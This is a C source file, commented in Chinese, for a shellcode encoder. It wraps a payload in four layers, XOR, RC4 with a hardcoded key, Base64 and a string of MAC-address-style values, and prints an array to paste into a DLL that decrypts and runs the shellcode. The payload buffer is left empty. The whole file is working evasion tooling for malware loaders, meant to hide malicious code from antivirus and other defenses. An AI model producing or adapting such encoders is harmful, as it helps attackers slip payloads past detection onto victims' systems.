// shellcode_encoder_mac.c - 四层加密工具：XOR + RC4 + Base64 + MAC格式
#define _CRT_SECURE_NO_WARNINGS  // 解决sprintf警告
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// RC4结构体
typedef struct {
    unsigned char S[256];
    int i;
    int j;
} RC4_CTX;

// RC4初始化
void rc4_init(RC4_CTX* ctx, const unsigned char* key, size_t key_len) {
    int i, j;
    unsigned char temp;

    for (i = 0; i < 256; i++) {
        ctx->S[i] = (unsigned char)i;
    }

    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) & 0xFF;
        temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }

    ctx->i = 0;
    ctx->j = 0;
}

// RC4加密
void rc4_crypt(RC4_CTX* ctx, unsigned char* data, size_t len) {
    size_t k;
    unsigned char temp;

    for (k = 0; k < len; k++) {
        ctx->i = (ctx->i + 1) & 0xFF;
        ctx->j = (ctx->j + ctx->S[ctx->i]) & 0xFF;

        temp = ctx->S[ctx->i];
        ctx->S[ctx->i] = ctx->S[ctx->j];
        ctx->S[ctx->j] = temp;

        data[k] ^= ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 0xFF];
    }
}

// Base64编码
char* base64_encode(const unsigned char* data, size_t data_len) {
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    size_t encoded_len = 4 * ((data_len + 2) / 3);
    char* encoded = (char*)malloc(encoded_len + 1);
    if (!encoded) return NULL;

    size_t i, j;
    for (i = 0, j = 0; i < data_len;) {
        unsigned int octet_a = i < data_len ? data[i++] : 0;
        unsigned int octet_b = i < data_len ? data[i++] : 0;
        unsigned int octet_c = i < data_len ? data[i++] : 0;

        unsigned int triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        encoded[j++] = base64_chars[(triple >> 18) & 0x3F];
        encoded[j++] = base64_chars[(triple >> 12) & 0x3F];
        encoded[j++] = base64_chars[(triple >> 6) & 0x3F];
        encoded[j++] = base64_chars[triple & 0x3F];
    }

    int mod = (int)(data_len % 3);
    if (mod == 1) {
        encoded[encoded_len - 1] = '=';
        encoded[encoded_len - 2] = '=';
    }
    else if (mod == 2) {
        encoded[encoded_len - 1] = '=';
    }

    encoded[encoded_len] = '\0';
    return encoded;
}

// XOR加密
void xor_encrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// 将数据转换为MAC地址格式
char** data_to_mac_format(const unsigned char* data, size_t len, int* mac_count) {
    // 每个MAC地址包含6个字节
    *mac_count = (int)((len + 5) / 6);  // 修复类型转换警告
    char** mac_array = (char**)malloc((*mac_count + 1) * sizeof(char*));
    if (!mac_array) return NULL;

    for (int i = 0; i < *mac_count; i++) {
        mac_array[i] = (char*)malloc(18); // XX-XX-XX-XX-XX-XX\0
        if (!mac_array[i]) {
            // 清理已分配的内存
            for (int j = 0; j < i; j++) free(mac_array[j]);
            free(mac_array);
            return NULL;
        }

        // 格式化为MAC地址
        size_t offset = (size_t)i * 6;
        sprintf(mac_array[i], "%02X-%02X-%02X-%02X-%02X-%02X",
            offset < len ? data[offset] : 0,
            offset + 1 < len ? data[offset + 1] : 0,
            offset + 2 < len ? data[offset + 2] : 0,
            offset + 3 < len ? data[offset + 3] : 0,
            offset + 4 < len ? data[offset + 4] : 0,
            offset + 5 < len ? data[offset + 5] : 0
        );
    }

    mac_array[*mac_count] = NULL; // 结束标记
    return mac_array;
}

// 打印C数组格式
void print_c_array(const char* name, const unsigned char* data, size_t len) {
    printf("unsigned char %s[] = {\n    ", name);
    for (size_t i = 0; i < len; i++) {
        printf("0x%02x", data[i]);
        if (i < len - 1) {
            printf(", ");
            if ((i + 1) % 12 == 0) {
                printf("\n    ");
            }
        }
    }
    printf("\n};\n");
}

// 打印MAC地址数组
void print_mac_array(char** mac_array, int count) {
    printf("const char* mac_shellcode[] = {\n");
    for (int i = 0; i < count; i++) {
        printf("    \"%s\",\n", mac_array[i]);
    }
    printf("    NULL  // 结束标记\n");
    printf("};\n");
}

// 验证解密过程
void verify_decryption(const unsigned char* original, size_t len,
    const char* base64, const unsigned char* rc4_key) {
    printf("\n=== Verification Test ===\n");

    // 这里只是展示解密流程，实际解密在DLL中进行
    printf("Decryption order:\n");
    printf("1. MAC format -> Base64 string\n");
    printf("2. Base64 decode -> Binary data\n");
    printf("3. RC4 decrypt -> XOR encrypted data\n");
    printf("4. XOR decrypt (key=0xAB) -> Original shellcode\n");
    printf("\nIf all steps work correctly, the shellcode will execute.\n");
}

int main() {
    // 您的原始shellcode - 这里是示例，请替换为实际的shellcode
    unsigned char original_shellcode[] = "";

    size_t shellcode_len = sizeof(original_shellcode);

    // RC4密钥
    unsigned char rc4_key[] = "MySecretKey123!@#";

    // 创建工作副本
    unsigned char* shellcode = (unsigned char*)malloc(shellcode_len);
    if (!shellcode) {
        printf("Memory allocation failed\n");
        return 1;
    }
    memcpy(shellcode, original_shellcode, shellcode_len);

    printf("=== Shellcode Encoder (XOR + RC4 + Base64 + MAC) ===\n\n");
    printf("Original shellcode length: %zu bytes\n", shellcode_len);
    printf("RC4 key: %s\n", rc4_key);
    printf("XOR key: 0xAB\n\n");

    // 打印原始shellcode
    printf("1. Original shellcode:\n");
    print_c_array("original_shellcode", original_shellcode, shellcode_len);
    printf("\n");

    // 第1层：XOR加密
    xor_encrypt(shellcode, shellcode_len, 0xAB);
    printf("2. After XOR encryption (key=0xAB):\n");
    print_c_array("xor_encrypted", shellcode, shellcode_len);
    printf("\n");

    // 第2层：RC4加密
    RC4_CTX rc4_ctx;
    rc4_init(&rc4_ctx, rc4_key, strlen((char*)rc4_key));
    rc4_crypt(&rc4_ctx, shellcode, shellcode_len);
    printf("3. After RC4 encryption:\n");
    print_c_array("rc4_encrypted", shellcode, shellcode_len);
    printf("\n");

    // 第3层：Base64编码
    char* base64_encoded = base64_encode(shellcode, shellcode_len);
    if (!base64_encoded) {
        printf("Base64 encoding failed\n");
        free(shellcode);
        return 1;
    }

    printf("4. After Base64 encoding:\n");
    printf("const char base64_shellcode[] = \"%s\";\n", base64_encoded);
    printf("Base64 length: %zu bytes\n\n", strlen(base64_encoded));

    // 第4层：转换为MAC地址格式
        // 第4层：转换为MAC地址格式
    int mac_count;
    char** mac_array = data_to_mac_format((unsigned char*)base64_encoded, strlen(base64_encoded), &mac_count);
    if (!mac_array) {
        printf("MAC format conversion failed\n");
        free(shellcode);
        free(base64_encoded);
        return 1;
    }

    printf("5. After MAC address format conversion:\n");
    printf("MAC count: %d addresses\n", mac_count);
    print_mac_array(mac_array, mac_count);
    printf("\n");

    // 生成用于DLL的代码片段
    printf("\n=== Copy this to your DLL ===\n\n");
    printf("// Four-layer encrypted shellcode (XOR + RC4 + Base64 + MAC)\n");
    printf("// Decryption order: MAC -> Base64 decode -> RC4 decrypt -> XOR decrypt\n");
    print_mac_array(mac_array, mac_count);
    printf("\n");
    printf("// RC4 key (keep this secret!)\n");
    printf("const unsigned char rc4_key[] = \"%s\";\n\n", rc4_key);

    // 验证解密流程
    verify_decryption(original_shellcode, shellcode_len, base64_encoded, rc4_key);

    // 清理内存
    free(shellcode);
    free(base64_encoded);

    // 清理MAC数组
    for (int i = 0; i < mac_count; i++) {
        free(mac_array[i]);
    }
    free(mac_array);

    printf("\n=== Encoding Complete ===\n");
    printf("Total encryption layers: 4\n");
    printf("1. XOR (key=0xAB)\n");
    printf("2. RC4 (key=%s)\n", rc4_key);
    printf("3. Base64 encoding\n");
    printf("4. MAC address format\n");
    printf("\nRemember to update the mac_shellcode array in your DLL!\n");

    return 0;
}


